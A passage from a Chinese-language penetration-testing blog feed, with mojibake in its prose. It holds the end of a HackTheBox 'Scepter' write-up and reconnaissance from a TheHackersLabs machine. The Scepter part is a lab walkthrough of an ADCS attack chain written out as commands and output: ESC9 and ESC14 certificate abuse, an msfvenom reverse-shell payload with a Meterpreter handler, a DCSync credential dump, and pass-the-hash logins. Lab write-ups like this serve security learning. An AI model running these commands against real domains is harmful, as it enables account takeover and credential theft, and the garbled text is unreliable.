[*] Saved BloodHound data to '20250425111914_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
```

ESC4 ä¹Ÿæœ‰ï¼Œä½†æ˜¯æˆ‘ä»¬å½“å‰çš„ç”¨æˆ·æ— æ³•å®ç°ã€‚æœ€åå‘ç° `ESC9` è²Œä¼¼æ˜¯æˆ‘ä»¬å½“å‰å¯ä»¥åˆ©ç”¨çš„

![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image4.png)

åˆ©ç”¨é“¾æ¥ï¼šhttps://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension

è¯¥ç»„ç»‡å±æ€§ï¼š

| å±æ€§ | å€¼ |
| --- | --- |
| Any Purpose | False |
| Authorized Signatures Required | 0 |
| Certificate Authorities | scepter-DC01-CA |
| Certificate Name Flag | SubjectRequireEmail<br>SubjectRequireDnsAsCn<br>SubjectAltRequireEmail |
| Client Authentication | True |
| Display Name | StaffAccessCertificate |
| Enabled | True |
| Enrollee Supplies Subject | False |
| Enrollment Agent | False |
| Enrollment Flag | NoSecurityExtension<br>AutoEnrollment |
| Extended Key Usage | Client Authentication<br>Server Authentication |
| Minimum RSA Key Length | 2,048 |
| Private Key Flag | 16842752 |
| Renewal Period | 6 weeks |
| Requires Key Archival | False |
| Requires Manager Approval | False |
| Template Name | StaffAccessCertificate |
| Validity Period | 99 years |
| Domain | SCEPTER.HTB |
| Type | Certificate Template |

æ¥è‡ªä¸Šé¢çš„é“¾æ¥ï¼šåœ¨æ­¤æ–¹æ¡ˆä¸­ï¼Œuser1 å¯¹ user2 å…·æœ‰Â `GenericWrite`ï¼Œå¹¶å¸Œæœ›å…¥ä¾µ user3ã€‚å…è®¸ user2 æ³¨å†Œä¸€ä¸ªæ˜“å—æ”»å‡»çš„æ¨¡æ¿ï¼Œè¯¥æ¨¡æ¿åœ¨Â `msPKI-Enrollment-Flag`Â å€¼ä¸­æŒ‡å®šÂ `CT_FLAG_NO_SECURITY_EXTENSION`Â æ ‡å¿—ã€‚

```bash
certipy-ad shadow auto -username "a.carter@scepter.htb" -p "123456" -account d.baker -dc-ip 10.10.11.65
certipy-ad account update -username "a.carter@scepter.htb" -p "123456" -user d.baker -upn h.brown -dc-ip 10.10.11.65
certipy-ad req -username "d.baker@scepter.htb" -hashes 18b5fb0d99e7a475316213c15b6f22ce -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' -dc-ip 10.10.11.65
certipy-ad account update -username "a.carter@scepter.htb" -p "123456" -user d.baker -upn "d.baker@scepter" -dc-ip 10.10.11.65
certipy-ad auth -pfx 'h.brown.pfx' -domain "scepter.htb" -dc-ip 10.10.11.65
```

æ‰§è¡Œåˆ°ç¬¬ä¸‰æ¡çš„æ—¶å€™å‡ºç°äº†å¦‚ä¸‹é”™è¯¯

```bash
âœ  ADCS certipy-ad req -username "d.baker@scepter.htb" -hashes 18b5fb0d99e7a475316213c15b6f22ce -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' -dc-ip 10.10.11.65

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.
[*] Request ID is 38
Would you like to save the private key? (y/N) Y
[*] Saved private key to 38.key
[-] Failed to request certificate
```

è¡¨æ˜åœ¨è¯ä¹¦ç”³è¯·è¿‡ç¨‹ä¸­ï¼Œ**è¯ä¹¦é¢å‘è¯·æ±‚**ä¸­éœ€è¦åŒ…å« **email** ä¿¡æ¯ï¼Œä½†åœ¨ä½ çš„è¯·æ±‚ä¸­ï¼Œ**email ä¿¡æ¯ç¼ºå¤±æˆ–æ— æ³•è·å–**ã€‚å…·ä½“æ¥è¯´ï¼Œé”™è¯¯ `CERTSRV_E_SUBJECT_EMAIL_REQUIRED` æŒ‡æ˜ï¼Œè¯ä¹¦æ¨¡æ¿è¦æ±‚åœ¨ **Subject** æˆ– **Subject Alternative Name (SAN)** ä¸­å¿…é¡»åŒ…å«æœ‰æ•ˆçš„ email åœ°å€ã€‚

è¯¢é—®**ä½¬**ä»¬åå¾—çŸ¥å¯ä»¥é€šè¿‡ `BloodyAD` æ¥ä¿®æ”¹ï¼Œå°† d.baker çš„

```bash
bloodyAD -d scepter.htb -u a.carter -p 123456 --host dc01.scepter.htb set object d.baker mail -v h.brown@scepter.htb
```

é‚£ä¹ˆå‘½ä»¤å°±å˜ä¸º

```bash
certipy-ad shadow auto -username "a.carter@scepter.htb" -p "123456" -account d.baker -dc-ip 10.10.11.65
certipy-ad account update -username "a.carter@scepter.htb" -p "123456" -user d.baker -upn h.brown -dc-ip 10.10.11.65
bloodyAD -d scepter.htb -u a.carter -p 123456 --host dc01.scepter.htb set object d.baker mail -v h.brown@scepter.htb
certipy-ad req -username "d.baker@scepter.htb" -hashes 18b5fb0d99e7a475316213c15b6f22ce -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' -dc-ip 10.10.11.65
certipy-ad account update -username "a.carter@scepter.htb" -p "123456" -user d.baker -upn "d.baker@scepter" -dc-ip 10.10.11.65
certipy-ad auth -pfx 'd.baker.pfx' -domain "scepter.htb" -dc-ip 10.10.11.65 -username h.brown
```

æœ€åè·å¾— `h.brown`  çš„ TGT

```bash
âœ  Scepter certipy-ad auth -pfx 'd.baker.pfx' -domain "scepter.htb" -dc-ip 10.10.11.65 -username h.brown
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: h.brown@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'h.brown.ccache'
[*] Trying to retrieve NT hash for 'h.brown'
[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
```

å¯¼å…¥ TGT

```bash
âœ  Scepter export KRB5CCNAME=h.brown.ccache 
```

ç¼–å†™ `/etc/krb5.conf`

```bash
âœ  Scepter cat /etc/krb5.conf                                                      
[libdefaults]
    default_realm = scepter.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    SCEPTER.HTB = {
        kdc = dc01.scepter.htb
        admin_server = dc01.haze.htb
    }

[domain_realm]
    .scepter.htb = scepter.HTB
    scepter.htb = scepter.HTB
```

ä½¿ç”¨`evil-winrm`ç™»å½•

```bash
âœ  Scepter ntpdate -s 10.10.11.65 ; evil-winrm -r scepter.htb -i dc01.scepter.htb -u h.brown
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\h.brown\Documents> 
```

ç»ˆäºç™»å½•è¿›æ¥äº†ï¼Œäº‹ä¸å®œè¿Ÿå…ˆè¯» user.txt

```bash
*Evil-WinRM* PS C:\Users\h.brown\Desktop> type user.txt
4e1f18052814cfb9f26a1497a8bc1cc6
```

æ”¶é›†ä¸€æ³¢æ•°æ®

```bash
*Evil-WinRM* PS C:\Users\h.brown\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```bash
*Evil-WinRM* PS C:\Users\h.brown\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                        Attributes
=========================================== ================ ========================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                               Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                               Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                               Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                               Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                   Mandatory group, Enabled by default, Enabled group
SCEPTER\CMS                                 Group            S-1-5-21-74879546-916818434-740295365-1601 Mandatory group, Enabled by default, Enabled group
SCEPTER\Protected Users                     Group            S-1-5-21-74879546-916818434-740295365-525  Mandatory group, Enabled by default, Enabled group
SCEPTER\Helpdesk Admins                     Group            S-1-5-21-74879546-916818434-740295365-1105 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization Certificate  Well-known group S-1-5-65-1                                 Mandatory group, Enabled by default, Enabled group
```

## To P.adams

### ESC14 - **å¯¹ altSecurityIdentities çš„å†™å…¥è®¿é—®æƒé™**

ç°åœ¨ç›®æ ‡ç”¨æˆ·æ˜¯ `P.adams`

![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image5.png)

æšä¸¾ç”¨æˆ· `h.brown`  æ˜¯å¦æœ‰ä¿®æ”¹æŸäº›å¯¹è±¡ï¼ˆå¦‚ç»„æˆå‘˜å…³ç³»ã€ACL æˆ–æƒé™ï¼‰çš„èƒ½åŠ›ã€‚

```bash
âœ  Scepter bloodyAD --host dc01.scepter.htb -d scepter.htb -u h.brown -k get writable --de
...
distinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
altSecurityIdentities: WRITE
```

å¯¹ `p.adams` çš„ `altSecurityIdentities` å¯å†™

å¤§æ¦‚æ˜¯å¯ä»¥åˆ©ç”¨ï¼šhttps://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-a-write-access-on-altsecurityidentities | https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9

æ”»å‡»è€…å¯¹ç›®æ ‡çš„Â `altSecurityIdentities`Â å±æ€§å…·æœ‰å†™å…¥æƒé™ã€‚ä»–å¯ä»¥å°†è¯ä¹¦æ³¨å†Œä¸ºå—å®³è€…ï¼Œå¹¶é€šè¿‡ä¿®æ”¹å…¶Â `altSecurityIdentities`Â å±æ€§å¹¶å°†å…¶æŒ‡å‘è·å–çš„è¯ä¹¦æ¥ä¸ºç›®æ ‡åˆ›å»ºæ˜¾å¼æ˜ å°„ã€‚ç„¶åï¼Œå¯ä»¥ä½¿ç”¨è¯¥è¯ä¹¦ä½œä¸ºç›®æ ‡è¿›è¡Œèº«ä»½éªŒè¯ã€‚

æ”»å‡»æ ¹æ®ï¼šhttps://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9 çš„ `ESC14`åœºæ™¯`A` 

å…ˆä½¿ç”¨ h.brown æ¥è¿›è¡Œä¸Šçº¿ MSFï¼Œåç»­ä¸€äº›æ“ä½œåœ¨`evil-winrm`ä¸­æ“ä½œä¼šæœ‰`bug`

```bash
âœ  Scepter msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.59 lport=1234 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

```bash
âœ  Scepter msfconsole 
Metasploit tip: View all productivity tips with the tips command

_                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
|/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\

=[ metasploit v6.4.34-dev                          ]
+ -- --=[ 2461 exploits - 1267 auxiliary - 431 post       ]
+ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[*] Starting persistent handler(s)...
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lport 1234
lport => 1234
msf6 exploit(multi/handler) > set lhost 10.10.16.59
lhost => 10.10.16.59
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.59:1234 
```

```bash
*Evil-WinRM* PS C:\Users\h.brown\Documents> upload shell.exe
                                        
Info: Uploading /root/Desktop/test/Scepter/shell.exe to C:\Users\h.brown\Documents\shell.exe
                                        
Data: 98400 bytes of 98400 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\h.brown\Documents> ./shell.exe
```

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.59:1234 
[*] Sending stage (177734 bytes) to 10.10.11.65
[*] Meterpreter session 1 opened (10.10.16.59:1234 -> 10.10.11.65:60515) at 2025-04-26 06:25:04 -0400

meterpreter > 
```

åˆ›å»ºè®¡ç®—æœºè´¦æˆ· `ciallo`

```bash
âœ  Scepter bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 123456 add computer ciallo 123456
[+] ciallo created
```

é€šè¿‡ `certipy` è¯·æ±‚è¯ä¹¦

```bash
âœ  Scepter certipy-ad req -username "ciallo$" -p 123456 -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'Machine' -dc-ip 10.10.11.65 -debug

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'dc01.scepter.htb' at '10.10.11.65'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.65[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.65[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 23
[*] Got certificate with DNS Host Name 'ciallo.scepter.htb'
[*] Certificate object SID is 'S-1-5-21-74879546-916818434-740295365-9104'
[*] Saved certificate and private key to 'ciallo.pfx'
```

å°†è¯ä¹¦è½¬æ¢ä¸º`crt`å¹¶æŸ¥çœ‹ä¿¡æ¯

```bash
âœ  Scepter certipy-ad cert -pfx ciallo.pfx -nokey -out ciallo.crt
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'ciallo.crt'
```

```bash
âœ  Scepter openssl x509 -in ciallo.crt -noout -serial -issuer
serial=620000001B02CCD1DA2D79435E00000000001B
issuer=DC=htb, DC=scepter, CN=scepter-DC01-CA
```

æˆ‘ä»¬ä½¿ç”¨è¯ä¹¦ä¸­çš„åºåˆ—å·å’Œé¢å‘è€…Â `distinguishedName`Â æ¥è·å– `X509IssuerSerialNumber` æ˜ å°„æ ¼å¼

ä½¿ç”¨ GPT æ¥æ ¹æ®è„šæœ¬ï¼šhttps://github.com/JonasBK/Powershell/blob/master/Get-X509IssuerSerialNumberFormat.ps1 æ”¹ç¼–ä¸º Python è„šæœ¬ï¼Œå¹¶è¿è¡Œã€‚

```bash
import argparse

def convert(serial, issuer):
    serial = serial.replace(':', '').lower()
    serial_bytes = bytearray.fromhex(serial)
    serial_bytes.reverse()
    serial_hex = ''.join(['%02x' % b for b in serial_bytes])
    
    # æ‹†åˆ† issuerï¼Œå¹¶åè½¬é¡ºåº
    issuer_parts = issuer.split(',')
    issuer_parts = [p.strip() for p in issuer_parts]
    issuer_parts.reverse()  # åè½¬é¡ºåºï¼Œè¿™é‡Œä¸æ”¹
    issuer_str = ','.join(issuer_parts)
    
    # è°ƒæ•´è¾“å‡ºé¡ºåºï¼šç¡®ä¿ "DC=scepter,DC=htb" åœ¨ "CN=scepter-DC01-CA" ä¹‹å‰
    issuer_str = issuer_str.replace("CN=", "").replace("DC=", "CN=").replace(",", ",DC=").strip()
    
    print(f"X509:<I>{issuer_str}<SR>{serial_hex}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-serial', required=True, help='Certificate serial (colon separated)')
    parser.add_argument('-issuer', required=True, help='Certificate issuer')
    args = parser.parse_args()
    
    convert(args.serial, args.issuer)
```

```bash
âœ  Scepter python Get-X509IssuerSerialNumberFormat.py
X509:<I>CN=scepter-DC01-CA,DC=scepter,DC=htb<SR>B10000000000E53497D2AD1DCC20B100000026
```

é€šè¿‡ PowerShell æ›´æ”¹ç”¨æˆ· h.brown çš„ `altSecurityIdentities` å±æ€§ï¼ˆGPTï¼‰

```bash
$map = 'X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>2800000000008dde9c88b25b6ad22800000062'
Set-ADUser p.adams -Replace @{altSecurityIdentities=$map}
```

```bash
meterpreter > shell
Process 4920 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.7131]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\h.brown\Documents>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\h.brown\Documents> $map = 'X509:<I>CN=scepter-DC01-CA,DC=scepter,DC=htb<SR>170000000000f4a3741fa7d9137b1700000062'
$map = 'X509:<I>CN=scepter-DC01-CA,DC=scepter,DC=htb<SR>170000000000f4a3741fa7d9137b1700000062'
PS C:\Users\h.brown\Documents> Set-ADUser -Identity "p.adams" -Replace @{altSecurityIdentities=$map}
Set-ADUser -Identity "p.adams" -Replace @{altSecurityIdentities=$map}
```

æŸ¥çœ‹æ›´æ”¹åçš„å±æ€§å€¼

```bash
Get-ADUser -Identity "p.adams" -Properties altSecurityIdentities | Select-Object altSecurityIdentities
```

é€šè¿‡ `certipy` æ ¹æ®è®¡ç®—æœºè´¦æˆ·çš„è¯ä¹¦ `ciallo.pfx` ç”³è¯·ç”¨æˆ· `p.adams` çš„ `TGT`

```bash
âœ  Scepter certipy-ad auth -pfx ciallo.pfx -dc-ip 10.10.11.65 -username p.adams
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] The provided username does not match the identification found in the provided certificate: 'P.ADAMS' - 'ciallo$'
Do you want to continue? (Y/n) y
[*] Using principal: p.adams@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'p.adams.ccache'
[*] Trying to retrieve NT hash for 'p.adams'
[*] Got hash for 'p.adams@scepter.htb': aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0
```

![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image6.png)

ç›´æ¥ `DCSync`

```bash
âœ  Scepter secretsdump.py -k -no-pass dc01.scepter.htb -dc-ip 10.10.11.65                                       
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
                                                                                                               
[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
...many...
```

```bash
âœ  Scepter evil-winrm -i dc01.scepter.htb -u administrator -H a291ead3493f9773dc615e66c2ea21c4
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

```bash
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
fcd40eb94aeca1942488f8decb6cc0b7
```

## æ€»ç»“

åæ­£å°±æ˜¯æ¯æ¬¡æ‰“ADéƒ½æ˜¯ä¸ä¼šçš„ï¼Œé å¤§ä½¬å¸¦è¿‡çš„â€¦

ç¬¬ä¸€æ¬¡é‡åˆ° ADCS ç±»çš„æ”»å‡»ï¼Œæ— ä»ä¸‹æ‰‹ï¼Œä»»é‡é“è¿œã€‚
]]></content:encoded>
            <category>é¶æœº</category>
            <category>Windowsé¶æœº</category>
            <category>HackTheBox</category>
            <category>ADCS</category>
            <category>ESC</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Mentallity]]></title>
            <link>https://www.sunsetaction.top/2025/07/23/TheHackersLabsMentallity</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/23/TheHackersLabsMentallity</guid>
            <pubDate>Wed, 23 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Mentallity https://labs.thehackerslabs.com/machine/120 Recon PortScan namp ç«¯å£æ‰«æ è²Œä¼¼æ˜¯åŒç½‘å¡ æšä¸¾æµ‹è¯• SMB åŒ¿åè´¦æˆ·æµ‹è¯• FTP åŒ¿åæµ‹è¯• HTTP HTTP 80 HTTP 8080 å‘ç°ä¸€ä¸ªç™»å½•é¡µé¢ æˆ‘ä»¬ç‚¹å‡»ç™»å½•...]]></description>
            <content:encoded><![CDATA[
# Mentallity

> https://labs.thehackerslabs.com/machine/120
> 

![image.png](/post-images/TheHackersLabsMentallity/image.png)

## Recon

### PortScan

`namp` ç«¯å£æ‰«æ

```bash
âœ  Mentallity nmap -sn 192.168.56.0/24                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:45 CST
Nmap scan report for 192.168.56.1
Host is up (0.00032s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00027s latency).
MAC Address: 08:00:27:3B:D1:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.28
Host is up (0.00024s latency).
MAC Address: 08:00:27:C2:70:8B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.91
Host is up (0.00028s latency).
MAC Address: 08:00:27:11:40:07 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.5
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 27.97 seconds
```

è²Œä¼¼æ˜¯åŒç½‘å¡

```bash
âœ  Mentallity nmap -sT -min-rate 10000 -p- 192.168.56.28
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:46 CST 
Warning: 192.168.56.28 giving up on port because retransmission cap hit (10). 
Nmap scan report for 192.168.56.28              
Host is up (0.00057s latency).                  
Not shown: 63744 closed tcp ports (conn-refused), 1762 filtered tcp ports (no-response)
PORT      STATE SERVICE                         
21/tcp    open  ftp                             
53/tcp    open  domain                          
80/tcp    open  http                            
88/tcp    open  kerberos-sec                    
135/tcp   open  msrpc                           
139/tcp   open  netbios-ssn                     
389/tcp   open  ldap                            
445/tcp   open  microsoft-ds                    
464/tcp   open  kpasswd5                        
593/tcp   open  http-rpc-epmap                  
636/tcp   open  ldapssl                         
3268/tcp  open  globalcatLDAP                   
3269/tcp  open  globalcatLDAPssl                
5985/tcp  open  wsman                           
8080/tcp  open  http-proxy                      
9389/tcp  open  adws                            
47001/tcp open  winrm  
...    

âœ  Mentallity nmap -sT -min-rate 10000 -p- 192.168.56.91
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:46 CST
Warning: 192.168.56.91 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.56.91
Host is up (0.00024s latency).
Not shown: 63929 closed tcp ports (conn-refused), 1577 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8080/tcp  open  http-proxy
9389/tcp  open  adws
47001/tcp open  winrm    
...     
```

```bash
âœ  Mentallity nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.28
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:49 CST
Nmap scan report for 192.168.56.28
Host is up (0.00046s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
|_ssl-date: 2025-07-23T12:50:56+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=VulnFTP
| Subject Alternative Name: DNS:VulnFTP
| Not valid before: 2025-07-17T09:01:44
|_Not valid after:  2026-07-17T09:21:44
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-23 12:50:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl
| Not valid before: 2025-07-17T13:49:22
|_Not valid after:  2026-07-17T13:49:22
|_ssl-date: TLS randomness does not represent time                                                                                                                                              
445/tcp   open  microsoft-ds?                                                                                                                                                                   
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl
| Not valid before: 2025-07-17T13:49:22
|_Not valid after:  2026-07-17T13:49:22
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl
| Not valid before: 2025-07-17T13:49:22
|_Not valid after:  2026-07-17T13:49:22
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl
| Not valid before: 2025-07-17T13:49:22
|_Not valid after:  2026-07-17T13:49:22
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Mentality \xC2\xB7 Innovating Beyond Limits
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
MAC Address: 08:00:27:C2:70:8B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2022 (99%), Microsoft Windows Server 2016 or Server 2019 (97%), Microsoft Windows 10 1703 or Windows 11 21H2 (97%), Microsoft Windows 11 21H2 (96%), Windows Server 2019 (96%), Microsoft Windows Server 2016 (94%), Microsoft Windows 10 1703 (94%), Microsoft Windows 10 1507 - 1607 (94%), Microsoft Windows Server 2012 or 2012 R2 (94%), Microsoft Windows Server 2012 R2 Update 1 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: WIN-9FQTT7GPAVK; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-07-23T12:50:48
|_  start_date: N/A
|_nbstat: NetBIOS name: WIN-9FQTT7GPAVK, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:c2:70:8b (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms 192.168.56.28

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.86 seconds
```

### æšä¸¾æµ‹è¯•

`SMB` åŒ¿åè´¦æˆ·æµ‹è¯•

```bash
âœ  Mentallity nxc smb 192.168.56.28 -u anonymous -p '' --smb-timeout 9999
SMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl) (signing:True) (SMBv1:False) 
